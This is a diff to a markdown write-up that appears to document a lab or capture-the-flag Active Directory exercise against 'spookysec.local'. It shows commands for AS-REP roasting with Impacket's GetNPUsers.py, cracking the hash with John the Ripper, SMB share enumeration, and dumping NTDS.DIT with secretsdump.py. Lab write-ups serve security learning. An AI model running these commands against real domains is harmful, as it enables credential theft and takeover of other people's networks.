@@ -22,4 +22,38 @@
 
 
 ## Abusing Kerberos
-- Using the usernames we got from Kerbrute we are going to use Impacket's tool "GetNPUsers.py" to perform an attack method called ASREPRoasting   
+- Using the usernames we got from Kerbrute we are going to use Impacket's tool "GetNPUsers.py" to perform an attack method called ASREPRoasting
+  
+```bash
+python3 ./GetNPUsers.py spookysec.local/svc-admin -no-pass 
+```
+
+![GetNPUsers.py](2022-02-20-06-52-39.png)
+
+- Used John the Ripper to crack the hash found for `svc-admin` account 
+
+```bash
+# kerbhash.txt simply contains the discovered hash from GetNPUsers.py 
+john kerbhash.txt --wordlist=./passwordlist.txt
+```
+
+
+![John The Ripper ](2022-02-20-07-26-11.png)
+
+
+## Enumerating SMB Shares 
+- used `smbclient` to find more shares 
+
+![smbmap results](2022-02-20-07-41-07.png)
+
+- Used credentials and `smbclient` to connect to `backup` share 
+
+![smbclient connecting](2022-02-21-16-27-21.png)
+
+- Then used `base64 decode <<<` to decode the string found
+- Using the `backup` user credentials to dump NTDS.DIT
+
+
+  ```bash
+  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local 
+  ```
